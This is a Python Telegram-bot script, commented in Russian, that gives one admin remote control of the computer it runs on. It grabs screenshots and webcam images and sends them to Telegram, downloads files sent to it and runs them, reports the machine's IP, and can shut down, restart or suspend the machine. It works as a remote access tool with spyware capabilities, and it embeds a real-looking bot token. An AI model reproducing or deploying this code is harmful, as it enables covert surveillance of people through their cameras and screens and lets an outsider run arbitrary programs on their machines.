import os
import subprocess
import socket
import time
import cv2
from PIL import ImageGrab
import telebot
from telebot import types
import tempfile

# ===== КОНФИГУРАЦИЯ =====
BOT_TOKEN = "7962451027:AAFuCZQDWuAqNmXy3VsxfVBQx1v5F1RsviY"  # Замените на токен от @BotFather
ADMIN_ID = 5994747509  # Замените на ваш Telegram ID
# ========================

bot = telebot.TeleBot(BOT_TOKEN)

# Проверка прав администратора
def is_admin(user_id):
    return user_id == ADMIN_ID

# Получаем IP компьютера
def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            hostname = socket.gethostname()
            return socket.gethostbyname(hostname)
        except:
            return "Не удалось определить IP"

# Делаем скриншот экрана
def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        filename = f"screenshot_{int(time.time())}.png"
        screenshot.save(filename)
        return filename
    except Exception as e:
        print(f"Ошибка скриншота: {e}")
        return None

# Делаем скриншот веб-камеры
def take_webcam_shot():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        
        # Даем камере время на инициализацию
        time.sleep(2)
        
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            return None
        
        filename = f"webcam_{int(time.time())}.jpg"
        cv2.imwrite(filename, frame)
        return filename
    except Exception as e:
        print(f"Ошибка веб-камеры: {e}")
        return None

# Запускаем файл на компьютере
def run_file(file_path):
    try:
        if os.name == 'nt':  # Для Windows
            os.startfile(file_path)
        else:  # Для Linux/Mac
            subprocess.Popen(['xdg-open', file_path])
        return True
    except Exception as e:
        print(f"Ошибка запуска файла: {e}")
        return False

# Основные команды
@bot.message_handler(commands=['start'])
def start(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "⛔ Доступ запрещен!")
        return
        
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton('📂 Файлы')
    btn2 = types.KeyboardButton('🖥 Система')
    btn3 = types.KeyboardButton('📷 Скриншот экрана')
    btn4 = types.KeyboardButton('📸 Скриншот вебки')
    markup.add(btn1, btn2, btn3, btn4)
    
    bot.send_message(
        message.chat.id,
        f"🖥 Удалённый доступ активирован!\nIP: {get_ip()}\nID: {message.from_user.id}",
        reply_markup=markup
    )

# Обработка документов - ЗАПУСК ФАЙЛА ПРИ ОТПРАВКЕ
@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "⛔ Доступ запрещен!")
        return
        
    try:
        # Получаем информацию о файле
        file_info = bot.get_file(message.document.file_id)
        file_name = message.document.file_name
        
        # Создаем временную директорию для сохранения
        temp_dir = tempfile.mkdtemp()
        file_path = os.path.join(temp_dir, file_name)
        
        # Скачиваем файл
        bot.send_message(message.chat.id, f"⬇️ Скачиваю файл: {file_name}")
        with open(file_path, 'wb') as new_file:
            new_file.write(bot.download_file(file_info.file_path))
        
        # Запускаем файл
        bot.send_message(message.chat.id, f"🚀 Запускаю файл: {file_name}")
        if run_file(file_path):
            bot.send_message(message.chat.id, f"✅ Файл успешно запущен!")
        else:
            bot.send_message(message.chat.id, "❌ Ошибка при запуске файла!")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}")# Обработка кнопок
@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "⛔ Доступ запрещен!")
        return
        
    # Главное меню
    if message.text == '📂 Файлы':
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton('📥 Скачать файл')
        btn2 = types.KeyboardButton('📤 Загрузить файл')
        btn3 = types.KeyboardButton('🗑 Удалить файл')
        btn_back = types.KeyboardButton('🔙 Назад')
        markup.add(btn1, btn2, btn3, btn_back)
        bot.send_message(message.chat.id, "📂 Управление файлами:", reply_markup=markup)

    elif message.text == '🖥 Система':
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton('🔌 Выключить ПК')
        btn2 = types.KeyboardButton('🔄 Перезагрузить')
        btn3 = types.KeyboardButton('⏸️ Спящий режим')
        btn_back = types.KeyboardButton('🔙 Назад')
        markup.add(btn1, btn2, btn3, btn_back)
        bot.send_message(message.chat.id, "🖥 Управление системой:", reply_markup=markup)

    # Системные функции
    elif message.text == '📷 Скриншот экрана':
        bot.send_message(message.chat.id, "🖥 Делаю скриншот экрана...")
        screenshot_path = take_screenshot()
        if screenshot_path and os.path.exists(screenshot_path):
            with open(screenshot_path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(screenshot_path)
        else:
            bot.send_message(message.chat.id, "❌ Не удалось сделать скриншот экрана!")

    elif message.text == '📸 Скриншот вебки':
        bot.send_message(message.chat.id, "📷 Подключаюсь к веб-камере...")
        webcam_path = take_webcam_shot()
        if webcam_path and os.path.exists(webcam_path):
            with open(webcam_path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(webcam_path)
        else:
            bot.send_message(message.chat.id, "❌ Не удалось получить доступ к веб-камере!")

    elif message.text == '🔌 Выключить ПК':
        if os.name == 'nt':
            os.system("shutdown /s /t 1")
        else:
            os.system("shutdown -h now")
        bot.send_message(message.chat.id, "🖥 Компьютер выключается!")

    elif message.text == '🔄 Перезагрузить':
        if os.name == 'nt':
            os.system("shutdown /r /t 1")
        else:
            os.system("shutdown -r now")
        bot.send_message(message.chat.id, "🔄 Компьютер перезагружается!")
    
    elif message.text == '⏸️ Спящий режим':
        if os.name == 'nt':
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        else:
            os.system("systemctl suspend")
        bot.send_message(message.chat.id, "💤 Переход в спящий режим...")

    # Навигация
    elif message.text == '🔙 Назад':
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton('📂 Файлы')
        btn2 = types.KeyboardButton('🖥 Система')
        btn3 = types.KeyboardButton('📷 Скриншот экрана')
        btn4 = types.KeyboardButton('📸 Скриншот вебки')
        markup.add(btn1, btn2, btn3, btn4)
        bot.send_message(message.chat.id, "🔙 Главное меню", reply_markup=markup)

# Запуск бота
if __name__ == "__main__":
    print("====================================")
    print(f"🟢 Бот запущен! | Админ: {ADMIN_ID}")
    print(f"🌐 IP-адрес: {get_ip()}")
    print("====================================")
    bot.polling(none_stop=True)
